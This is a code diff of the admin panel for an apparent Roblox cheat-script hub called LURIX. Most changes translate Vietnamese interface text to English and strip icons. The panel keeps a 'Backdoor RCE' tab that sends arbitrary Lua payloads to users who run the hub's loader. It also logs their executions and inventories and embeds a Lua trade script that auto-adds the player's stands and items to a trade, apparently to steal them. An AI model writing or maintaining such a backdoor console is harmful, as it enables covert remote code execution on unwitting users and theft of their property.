@@ -2,13 +2,6 @@
 import { useState, useEffect, useMemo } from 'react';
 import Editor from '@monaco-editor/react';
 import { supabase } from '@/lib/supabase';
-import { 
-  Lock, Save, Plus, Key, Database, Settings, Trash2, Shield, Activity, 
-  Copy, Check, ExternalLink, Upload, Eraser, Sliders, Gamepad2, Youtube, 
-  MessageSquare, Loader2, Search, Eye, Download, LogOut, Terminal, Users, 
-  Globe, UserCheck, RefreshCw, AlertOctagon, CopyPlus, Code2, Radio, Zap,
-  Skull, AlertTriangle, Send, Server, Package, Box, Sparkles, Layers, X
-} from 'lucide-react';
 
 export default function AdminPage() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
@@ -30,7 +23,7 @@ export default function AdminPage() {
   const [isLoadingLogs, setIsLoadingLogs] = useState(false);
   const [copiedJoinId, setCopiedJoinId] = useState(null);
 
-  // Modal Kho Stand & Kho Đồ State
+  // Storage Modal State
   const [selectedStorageLog, setSelectedStorageLog] = useState(null);
   const [isStorageModalOpen, setIsStorageModalOpen] = useState(false);
   const [storageTab, setStorageTab] = useState('stands'); // 'stands' | 'inventory'
@@ -54,7 +47,6 @@ export default function AdminPage() {
 
   // UI States
   const [copiedLoader, setCopiedLoader] = useState(false);
-  const [copiedLogSnippet, setCopiedLogSnippet] = useState(false);
   const [copiedBackdoorSnippet, setCopiedBackdoorSnippet] = useState(false);
   const [isSaving, setIsSaving] = useState(false);
 
@@ -78,10 +70,10 @@ export default function AdminPage() {
         loadLogsData();
         loadBackdoorHistory();
       } else {
-        alert('❌ ' + (data.message || 'Mật khẩu Admin không đúng!'));
+        alert(data.message || 'Invalid admin password.');
       }
     } catch (err) {
-      alert('⚠️ Không thể kết nối API: ' + err.message);
+      alert('API connection error: ' + err.message);
     } finally {
       setIsLoggingIn(false);
     }
@@ -207,7 +199,7 @@ end)`;
       setCopiedJoinId(log.id);
       setTimeout(() => setCopiedJoinId(null), 2000);
     } catch (err) {
-      console.error('Lỗi copy script join:', err);
+      console.error('Copy join script error:', err);
     }
   };
 
@@ -218,7 +210,7 @@ end)`;
   };
 
   const handleSendBackdoor = async () => {
-    if (!backdoorLuaPayload.trim()) return alert('⚠️ Vui lòng nhập mã Lua Payload!');
+    if (!backdoorLuaPayload.trim()) return alert('Please enter a Lua payload.');
     setIsSendingBackdoor(true);
 
     try {
@@ -235,13 +227,13 @@ end)`;
 
       const data = await res.json();
       if (data.success) {
-        alert('⚡ ' + data.message);
+        alert(data.message);
         loadBackdoorHistory();
       } else {
-        alert('❌ Lỗi: ' + data.message);
+        alert('Error: ' + data.message);
       }
     } catch (err) {
-      alert('⚠️ Lỗi gửi lệnh: ' + err.message);
+      alert('Command error: ' + err.message);
     } finally {
       setIsSendingBackdoor(false);
     }
@@ -263,9 +255,9 @@ end)`;
 local AUTO_SEND_DELAY = 3                 
 local AUTO_ACCEPT = false                  
 
--- [[ BẬT / TẮT CHẾ ĐỘ THÊM ĐỒ ]]
-local ADD_STANDS = false  -- Set 'true' để thêm Stand, 'false' để tắt
-local ADD_ITEMS = true    -- Set 'true' để thêm Item, 'false' để tắt
+-- [[ TOGGLE ADD ITEMS ]]
+local ADD_STANDS = false  -- Set true to enable Stand
+local ADD_ITEMS = true    -- Set true to enable Item
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -297,7 +289,6 @@ TradeComm.OnClientEvent:Connect(function(action, data)
         local myStands = (data and data.ItemData and data.ItemData.Stands) or {}
         local myItems = (data and data.ItemData and data.ItemData.Items) or {}
 
-        -- Tự động thêm Stand (nếu bật ADD_STANDS)
         if ADD_STANDS then
             for _, standData in pairs(myStands) do
                 local standName = standData.Stand
@@ -315,7 +306,6 @@ TradeComm.OnClientEvent:Connect(function(action, data)
             end
         end
 
-        -- Tự động thêm Item (nếu bật ADD_ITEMS)
         if ADD_ITEMS then
             for itemName, amount in pairs(myItems) do
                 if itemName and amount and amount > 0 then
@@ -381,17 +371,17 @@ sound:Play()`);
     }).eq('id', selectedScript.id);
     
     setIsSaving(false);
-    if (error) alert('Lỗi khi lưu: ' + error.message);
+    if (error) alert('Save error: ' + error.message);
     else {
-      alert('🎉 Đã lưu Raw Script thành công!');
+      alert('Script saved successfully.');
       loadAdminData();
     }
   };
 
   const handleCreateScript = async () => {
-    const newTitle = prompt('Nhập Tên Script mới (VD: Blox Fruits Auto Farm):');
+    const newTitle = prompt('Enter script title:');
     if (!newTitle) return;
-    const newSlug = prompt('Nhập Slug rút gọn (VD: bloxfruits):');
+    const newSlug = prompt('Enter script slug:');
     if (!newSlug) return;
     
     const cleanSlug = newSlug.toLowerCase().trim().replace(/\s+/g, '-');
@@ -403,9 +393,9 @@ sound:Play()`);
       status: 'working'
     }]).select();
 
-    if (error) alert('Lỗi tạo Script: ' + error.message);
+    if (error) alert('Creation error: ' + error.message);
     else {
-      alert('✨ Tạo Script mới thành công!');
+      alert('Script created successfully.');
       await loadAdminData();
       if (data && data[0]) selectScriptHandler(data[0]);
     }
@@ -423,35 +413,34 @@ sound:Play()`);
       status: status
     }]).select();
 
-    if (error) alert('Lỗi nhân bản Script: ' + error.message);
+    if (error) alert('Duplicate error: ' + error.message);
     else {
-      alert('📋 Nhân bản Script thành công!');
+      alert('Script duplicated.');
       await loadAdminData();
       if (data && data[0]) selectScriptHandler(data[0]);
     }
   };
 
   const handleDeleteScript = async (id) => {
-    if (!confirm('⚠️ Bạn có chắc chắn muốn XÓA VĨNH VIỄN Script này không?')) return;
+    if (!confirm('Are you sure you want to delete this script?')) return;
     await supabase.from('scripts').delete().eq('id', id);
     setSelectedScript(null);
     loadAdminData();
   };
 
   const handleClearLogs = async () => {
-    if (!confirm('⚠️ Bạn có chắc chắn muốn XÓA SẠCH toàn bộ lịch sử Log không?')) return;
+    if (!confirm('Are you sure you want to clear all logs?')) return;
     await supabase.from('execution_logs').delete().neq('id', 0);
     setLogs([]);
-    alert('🧹 Đã xóa sạch danh sách Log!');
+    alert('Logs cleared.');
   };
 
-  // Supported Games Handlers
   const handleAddGame = () => {
-    setSupportedGames([...supportedGames, { name: 'Game Mới', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }]);
+    setSupportedGames([...supportedGames, { name: 'New Game', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }]);
   };
 
   const handleRemoveGame = (index) => {
-    if (supportedGames.length <= 1) return alert('Phải giữ lại ít nhất 1 Game!');
+    if (supportedGames.length <= 1) return alert('Must keep at least 1 game.');
     setSupportedGames(supportedGames.filter((_, i) => i !== index));
   };
 
@@ -467,7 +456,7 @@ sound:Play()`);
     const reader = new FileReader();
     reader.onload = (event) => {
       setCode(event.target.result);
-      alert(`📂 Đã nạp nội dung file "${file.name}" vào Editor!`);
+      alert(`File content loaded.`);
     };
     reader.readAsText(file);
     e.target.value = '';
@@ -486,15 +475,15 @@ sound:Play()`);
     ]);
     setIsSaving(false);
 
-    if (error) alert('Lỗi lưu Cấu hình: ' + error.message);
+    if (error) alert('Config error: ' + error.message);
     else {
-      alert('🚀 ĐÃ LƯU CẤU HÌNH TRANG CHÍNH THÀNH CÔNG!');
+      alert('Settings saved successfully.');
       loadAdminData();
     }
   };
 
   const handleSaveAdminPassword = async () => {
-    if (!newAdminPass.trim()) return alert('⚠️ Vui lòng nhập mật khẩu mới!');
+    if (!newAdminPass.trim()) return alert('Please enter a new password.');
     setIsSaving(true);
 
     try {
@@ -509,28 +498,27 @@ sound:Play()`);
 
       const data = await res.json();
       if (data.success) {
-        alert('🎉 Đã đổi mật khẩu thành công!');
+        alert('Password updated successfully.');
         setPasswordInput(newAdminPass);
         setNewAdminPass('');
       } else {
-        alert('❌ Lỗi: ' + data.message);
+        alert('Error: ' + data.message);
       }
     } catch (err) {
-      alert('⚠️ Lỗi kết nối: ' + err.message);
+      alert('Connection error: ' + err.message);
     } finally {
       setIsSaving(false);
     }
   };
 
-  // Helper parse kho data
   const parsedStandData = useMemo(() => {
-    if (!selectedStorageLog || !selectedStorageLog.stand_storage) return { slots: [], spec_storage: 'Trống' };
+    if (!selectedStorageLog || !selectedStorageLog.stand_storage) return { slots: [], spec_storage: 'Empty' };
     try {
       return typeof selectedStorageLog.stand_storage === 'string'
         ? JSON.parse(selectedStorageLog.stand_storage)
         : selectedStorageLog.stand_storage;
     } catch (e) {
-      return { slots: [], spec_storage: 'Trống' };
+      return { slots: [], spec_storage: 'Empty' };
     }
   }, [selectedStorageLog]);
 
@@ -561,13 +549,13 @@ sound:Play()`);
         <div className="absolute w-[400px] h-[400px] bg-[#6E96FF]/20 rounded-full blur-[140px] pointer-events-none" />
         <form onSubmit={handleLogin} className="z-10 bg-[#0a0d16]/90 border border-[#6E96FF]/40 p-6 sm:p-8 rounded-3xl w-full max-w-sm shadow-[0_0_50px_rgba(110,150,255,0.15)] backdrop-blur-2xl">
           <div className="flex items-center gap-2.5 justify-center mb-6 text-[#6E96FF] font-black text-xl tracking-wider uppercase">
-            <Shield className="w-7 h-7 text-[#6E96FF]" /> LURIX
+            LURIX
           </div>
           <div className="mb-4">
-            <label className="text-[11px] font-extrabold text-gray-400 mb-1.5 block">BẢO MẬT HỆ THỐNG</label>
+            <label className="text-[11px] font-extrabold text-gray-400 mb-1.5 block">ADMIN AUTHENTICATION</label>
             <input
               type="password"
-              placeholder="Nhập Mật khẩu Admin..."
+              placeholder="Enter password..."
               value={passwordInput}
               onChange={(e) => setPasswordInput(e.target.value)}
               className="w-full bg-black/80 border border-gray-800 rounded-xl p-3.5 text-white text-xs font-mono focus:border-[#6E96FF] outline-none transition-all shadow-inner"
@@ -578,8 +566,7 @@ sound:Play()`);
             disabled={isLoggingIn}
             className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_20px_rgba(110,150,255,0.4)] hover:brightness-110 transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 active:scale-95"
           >
-            {isLoggingIn ? <Loader2 className="w-4 h-4 animate-spin" /> : <Lock className="w-4 h-4" />}
-            {isLoggingIn ? 'ĐANG XÁC THỰC...' : 'ĐĂNG NHẬP'}
+            {isLoggingIn ? 'Authenticating...' : 'LOGIN'}
           </button>
         </form>
       </div>
@@ -592,8 +579,8 @@ sound:Play()`);
       {/* Top Header Bar */}
       <div className="bg-[#0a0d16]/90 border border-[#6E96FF]/30 p-4 rounded-3xl backdrop-blur-2xl flex flex-col sm:flex-row items-center justify-between gap-4 shadow-[0_10px_30px_rgba(0,0,0,0.5)]">
         <div className="flex items-center gap-3">
-          <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/40 flex items-center justify-center text-[#6E96FF]">
-            <Terminal className="w-5 h-5" />
+          <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/40 flex items-center justify-center text-[#6E96FF] font-black">
+            L
           </div>
           <div>
             <div className="flex items-center gap-2">
@@ -602,13 +589,13 @@ sound:Play()`);
                 <span className="w-1.5 h-1.5 bg-green-400 rounded-full animate-ping" /> V3.0 RCE ONLINE
               </span>
             </div>
-            <p className="text-[11px] text-gray-400 font-medium">Bảng điều khiển Raw Script & Remote Code Execution Backdoor</p>
+            <p className="text-[11px] text-gray-400 font-medium">Script & Remote Execution Control Panel</p>
           </div>
         </div>
 
         <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
           <button onClick={() => setIsAuthenticated(false)} className="bg-red-500/10 border border-red-500/30 text-red-400 hover:bg-red-500/20 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-all">
-            <LogOut className="w-3.5 h-3.5" /> Đăng Xuất
+            Logout
           </button>
         </div>
       </div>
@@ -616,22 +603,22 @@ sound:Play()`);
       {/* Stats Summary Cards */}
       <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
         <div className="bg-[#0a0d16]/80 border border-[#6E96FF]/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
-          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">TỔNG RAW SCRIPT</div>
+          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">SCRIPTS</div>
           <div className="text-xl sm:text-2xl font-black text-white mt-1">{scripts.length} <span className="text-xs text-gray-500 font-normal">Scripts</span></div>
         </div>
 
         <div className="bg-[#0a0d16]/80 border border-[#6E96FF]/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
-          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">LỢT EXECUTE LOGGED</div>
+          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">EXEC LOGS</div>
           <div className="text-xl sm:text-2xl font-black text-[#6E96FF] mt-1">{logs.length} <span className="text-xs text-gray-500 font-normal">Logs</span></div>
         </div>
 
         <div className="bg-[#0a0d16]/80 border border-yellow-500/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
-          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">GAME SUPPORT</div>
+          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">GAMES</div>
           <div className="text-xl sm:text-2xl font-black text-yellow-400 mt-1">{supportedGames.length} <span className="text-xs text-gray-500 font-normal">Games</span></div>
         </div>
 
         <div className="bg-[#0a0d16]/80 border border-green-500/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
-          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">VERCEL SERVER</div>
+          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">SERVER</div>
           <div className="text-xl sm:text-2xl font-black text-green-400 mt-1">ACTIVE <span className="text-xs text-green-400 font-bold">100%</span></div>
         </div>
       </div>
@@ -639,37 +626,37 @@ sound:Play()`);
       {/* Navigation Tabs */}
       <div className="flex bg-[#0a0d16] border border-gray-800 p-1.5 rounded-2xl overflow-x-auto text-xs font-extrabold gap-1.5 shadow-lg">
         <button onClick={() => setActiveTab('custom_home')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'custom_home' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
-          <Sliders className="w-4 h-4" /> 🎨 Cấu Hình Trang Chủ
+          Home Config
         </button>
 
         <button onClick={() => setActiveTab('scripts')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'scripts' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
-          <Database className="w-4 h-4" /> 💻 Quản Lý Raw Script ({scripts.length})
+          Scripts ({scripts.length})
         </button>
 
         <button onClick={() => { setActiveTab('backdoor'); loadBackdoorHistory(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'backdoor' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-yellow-400 hover:text-white'}`}>
-          <Radio className="w-4 h-4 animate-pulse text-yellow-400" /> ⚡ Backdoor / Remote Control
+          Backdoor RCE
         </button>
 
         <button onClick={() => { setActiveTab('user_logs'); loadLogsData(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'user_logs' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
-          <Users className="w-4 h-4" /> 📊 Log Người Dùng ({logs.length})
+          Logs ({logs.length})
         </button>
 
         <button onClick={() => setActiveTab('settings')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'settings' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
-          <Settings className="w-4 h-4" /> 🔑 Mật Khẩu Admin
+          Settings
         </button>
       </div>
 
-      {/* ==================== TAB 1: CẤU HÌNH TRANG CHỦ PUBLIC ==================== */}
+      {/* TAB 1: HOME CONFIG */}
       {activeTab === 'custom_home' && (
         <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
           <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
-            <Sliders className="w-4 h-4" /> CẤU HÌNH TRANG CHỦ PUBLIC
+            HOME CONFIGURATION
           </div>
 
           <div className="space-y-4">
             <div>
               <label className="text-xs font-bold text-[#6E96FF] flex items-center gap-1.5 mb-1">
-                <Database className="w-3.5 h-3.5" /> Loader Script Text Trang Chủ:
+                Home Loader Script:
               </label>
               <textarea
                 rows={3}
@@ -681,7 +668,7 @@ sound:Play()`);
 
             <div>
               <label className="text-xs font-bold text-[#6E96FF] flex items-center gap-1.5 mb-1">
-                <Key className="w-3.5 h-3.5" /> Access Key Trang Chủ:
+                Home Access Key:
               </label>
               <input
                 type="text"
@@ -691,14 +678,13 @@ sound:Play()`);
               />
             </div>
 
-            {/* Quản lý danh sách Game hỗ trợ */}
             <div className="border border-gray-800 p-4 rounded-2xl bg-black/40 space-y-3">
               <div className="flex items-center justify-between">
                 <label className="text-xs font-bold text-yellow-400 flex items-center gap-1.5">
-                  <Gamepad2 className="w-4 h-4" /> Danh Sách Game Support ({supportedGames.length}):
+                  Supported Games ({supportedGames.length}):
                 </label>
                 <button onClick={handleAddGame} className="bg-[#6E96FF]/20 text-[#6E96FF] border border-[#6E96FF]/40 px-3 py-1 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer hover:bg-[#6E96FF]/30 transition-all">
-                  <Plus className="w-3.5 h-3.5" /> Thêm Game
+                  + Add Game
                 </button>
               </div>
 
@@ -708,14 +694,14 @@ sound:Play()`);
                     <span>Game #{idx + 1}</span>
                     {supportedGames.length > 1 && (
                       <button onClick={() => handleRemoveGame(idx)} className="text-red-400 text-[10px] bg-red-500/10 px-2 py-0.5 rounded cursor-pointer">
-                        Xóa Game
+                        Remove
                       </button>
                     )}
                   </div>
                   <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                     <input
                       type="text"
-                      placeholder="Tên Game"
+                      placeholder="Game Name"
                       value={game.name}
                       onChange={(e) => handleGameChange(idx, 'name', e.target.value)}
                       className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs font-bold text-white"
@@ -729,14 +715,14 @@ sound:Play()`);
                     />
                     <input
                       type="text"
-                      placeholder="Trạng Thái"
+                      placeholder="Status"
                       value={game.status}
                       onChange={(e) => handleGameChange(idx, 'status', e.target.value)}
                       className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-green-400"
                     />
                     <input
                       type="text"
-                      placeholder="Tag (VD: ROBLOX)"
+                      placeholder="Tag (e.g. ROBLOX)"
                       value={game.tag}
                       onChange={(e) => handleGameChange(idx, 'tag', e.target.value)}
                       className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-[#6E96FF] font-mono"
@@ -746,10 +732,9 @@ sound:Play()`);
               ))}
             </div>
 
-            {/* Social Links & Tên Hub */}
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
               <div>
-                <label className="text-xs text-gray-400 font-semibold mb-1 flex items-center gap-1"><Youtube className="w-3.5 h-3.5 text-red-500"/> Link YouTube Channel:</label>
+                <label className="text-xs text-gray-400 font-semibold mb-1 block">YouTube Link:</label>
                 <input
                   type="text"
                   value={youtubeLink}
@@ -759,7 +744,7 @@ sound:Play()`);
               </div>
 
               <div>
-                <label className="text-xs text-gray-400 font-semibold mb-1 flex items-center gap-1"><MessageSquare className="w-3.5 h-3.5 text-indigo-400"/> Link Server Discord:</label>
+                <label className="text-xs text-gray-400 font-semibold mb-1 block">Discord Link:</label>
                 <input
                   type="text"
                   value={discordLink}
@@ -769,7 +754,7 @@ sound:Play()`);
               </div>
 
               <div>
-                <label className="text-xs text-gray-400 font-semibold mb-1 block">Badge Status Banner:</label>
+                <label className="text-xs text-gray-400 font-semibold mb-1 block">Badge Text:</label>
                 <input
                   type="text"
                   value={badgeText}
@@ -779,7 +764,7 @@ sound:Play()`);
               </div>
 
               <div>
-                <label className="text-xs text-gray-400 font-semibold mb-1 block">Site Title (Tên Hub):</label>
+                <label className="text-xs text-gray-400 font-semibold mb-1 block">Site Title:</label>
                 <input
                   type="text"
                   value={siteTitle}
@@ -795,35 +780,34 @@ sound:Play()`);
             disabled={isSaving}
             className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_20px_rgba(110,150,255,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 disabled:opacity-50 active:scale-95"
           >
-            {isSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />} LƯU CẤU HÌNH TRANG CHÍNH
+            {isSaving ? 'Saving...' : 'SAVE SETTINGS'}
           </button>
         </div>
       )}
 
-      {/* ==================== TAB 2: RAW SCRIPTS MANAGER ==================== */}
+      {/* TAB 2: SCRIPTS */}
       {activeTab === 'scripts' && (
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
           <div className="lg:col-span-4 bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl flex flex-col gap-3 h-fit">
             <button onClick={handleCreateScript} className="w-full bg-[#6E96FF] text-black font-black py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(110,150,255,0.3)] hover:brightness-110 active:scale-95 transition-all">
-              <Plus className="w-4 h-4" /> Tạo Raw Script Mới
+              + New Script
             </button>
 
             <div className="relative">
-              <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
               <input
                 type="text"
-                placeholder="Tìm theo tên hoặc slug..."
+                placeholder="Search title or slug..."
                 value={searchQuery}
                 onChange={(e) => setSearchQuery(e.target.value)}
-                className="w-full bg-black/80 border border-gray-800 rounded-xl pl-9 pr-3 py-2 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none"
+                className="w-full bg-black/80 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none"
               />
             </div>
 
             <div className="flex gap-1 overflow-x-auto text-[10px] font-extrabold pb-1">
-              <button onClick={() => setStatusFilter('all')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'all' ? 'bg-white/15 border-white text-white' : 'border-gray-800 text-gray-500'}`}>Tất cả ({scripts.length})</button>
-              <button onClick={() => setStatusFilter('working')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'working' ? 'bg-green-500/20 border-green-500 text-green-400' : 'border-gray-800 text-gray-500'}`}>🟢 Active</button>
-              <button onClick={() => setStatusFilter('updating')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'updating' ? 'bg-yellow-500/20 border-yellow-500 text-yellow-400' : 'border-gray-800 text-gray-500'}`}>🟡 Update</button>
-              <button onClick={() => setStatusFilter('patched')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'patched' ? 'bg-red-500/20 border-red-500 text-red-400' : 'border-gray-800 text-gray-500'}`}>🔴 Patched</button>
+              <button onClick={() => setStatusFilter('all')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'all' ? 'bg-white/15 border-white text-white' : 'border-gray-800 text-gray-500'}`}>All ({scripts.length})</button>
+              <button onClick={() => setStatusFilter('working')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'working' ? 'bg-green-500/20 border-green-500 text-green-400' : 'border-gray-800 text-gray-500'}`}>Active</button>
+              <button onClick={() => setStatusFilter('updating')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'updating' ? 'bg-yellow-500/20 border-yellow-500 text-yellow-400' : 'border-gray-800 text-gray-500'}`}>Update</button>
+              <button onClick={() => setStatusFilter('patched')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'patched' ? 'bg-red-500/20 border-red-500 text-red-400' : 'border-gray-800 text-gray-500'}`}>Patched</button>
             </div>
 
             <div className="flex flex-col gap-2 max-h-[520px] overflow-y-auto pr-1">
@@ -854,20 +838,19 @@ sound:Play()`);
               <div className="bg-[#0a0d16] border border-gray-800 p-4 sm:p-5 rounded-3xl space-y-4 shadow-xl">
                 <div className="bg-black/90 p-3.5 rounded-2xl border border-[#6E96FF]/40 space-y-2">
                   <div className="flex items-center justify-between text-[11px] text-[#6E96FF] font-bold">
-                    <span className="flex items-center gap-1.5"><ExternalLink className="w-3.5 h-3.5" /> Roblox Execution Loadstring URL:</span>
+                    <span>Execution Loadstring URL:</span>
                   </div>
                   <div className="bg-[#0c0f17] p-2.5 rounded-xl font-mono text-[11px] text-gray-300 break-all border border-gray-800 select-all">
                     {getScriptLoadstring(slug)}
                   </div>
                   <button onClick={() => handleCopyLoader(slug)} className="w-full bg-[#6E96FF] text-black font-black py-2 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer hover:brightness-110 active:scale-95 transition-all">
-                    {copiedLoader ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                    {copiedLoader ? 'Đã Sao Chép Loadstring Exec!' : 'Copy Raw Loadstring'}
+                    {copiedLoader ? 'Copied!' : 'Copy Loadstring'}
                   </button>
                 </div>
 
                 <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                   <div>
-                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Tên Script</label>
+                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Title</label>
                     <input value={title} onChange={(e) => setTitle(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-extrabold text-white" />
                   </div>
                   <div>
@@ -875,11 +858,11 @@ sound:Play()`);
                     <input value={slug} onChange={(e) => setSlug(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-[#6E96FF] font-mono" />
                   </div>
                   <div>
-                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Trạng Thái Script</label>
+                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Status</label>
                     <select value={status} onChange={(e) => setStatus(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white">
-                      <option value="working">🟢 Working</option>
-                      <option value="updating">🟡 Updating</option>
-                      <option value="patched">🔴 Patched</option>
+                      <option value="working">Working</option>
+                      <option value="updating">Updating</option>
+                      <option value="patched">Patched</option>
                     </select>
                   </div>
                 </div>
@@ -887,21 +870,21 @@ sound:Play()`);
                 <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
                   <div className="flex gap-2 flex-1 flex-wrap">
                     <button onClick={handleSaveScript} disabled={isSaving} className="bg-[#6E96FF] text-black font-black px-4 py-2.5 rounded-xl text-xs flex items-center gap-1.5 cursor-pointer">
-                      {isSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />} Lưu Mã Lua
+                      {isSaving ? 'Saving...' : 'Save Code'}
                     </button>
                     <button onClick={handleDuplicateScript} className="bg-purple-600/20 text-purple-300 border border-purple-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                      <CopyPlus className="w-4 h-4" /> Nhân Bản
+                      Duplicate
                     </button>
                     <label className="bg-blue-600/20 text-blue-300 border border-blue-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                      <Upload className="w-4 h-4" /> Upload .lua
+                      Upload .lua
                       <input type="file" accept=".lua,.txt" onChange={handleUploadToEditor} className="hidden" />
                     </label>
                     <button onClick={() => setCode('')} className="bg-yellow-600/20 text-yellow-400 border border-yellow-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                      <Eraser className="w-4 h-4" /> Clear
+                      Clear
                     </button>
                   </div>
                   <button onClick={() => handleDeleteScript(selectedScript.id)} className="bg-red-600/20 text-red-400 border border-red-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
-                    <Trash2 className="w-4 h-4" /> Xóa
+                    Delete
                   </button>
                 </div>
 
@@ -914,43 +897,39 @@ sound:Play()`);
         </div>
       )}
 
-      {/* ==================== TAB 3: BACKDOOR REMOTE CONTROL ==================== */}
+      {/* TAB 3: BACKDOOR RCE */}
       {activeTab === 'backdoor' && (
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
-          
-          {/* Backdoor Control Panel */}
           <div className="lg:col-span-7 bg-[#0a0d16] border border-yellow-500/30 p-5 rounded-3xl space-y-4 shadow-2xl">
             <div className="flex items-center justify-between border-b border-gray-800 pb-3">
               <div className="flex items-center gap-2">
-                <Radio className="w-5 h-5 text-yellow-400 animate-pulse" />
-                <h2 className="text-sm font-black text-yellow-400 uppercase tracking-wider">backdoor</h2>
+                <h2 className="text-sm font-black text-yellow-400 uppercase tracking-wider">BACKDOOR RCE</h2>
               </div>
               <span className="text-[10px] bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 px-2 py-0.5 rounded-full font-extrabold">
                 LOADSTRING
               </span>
             </div>
 
-            {/* Target Selector */}
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
               <div>
-                <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">TARGET:</label>
+                <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">TARGET TYPE:</label>
                 <select
                   value={backdoorTargetType}
                   onChange={(e) => setBackdoorTargetType(e.target.value)}
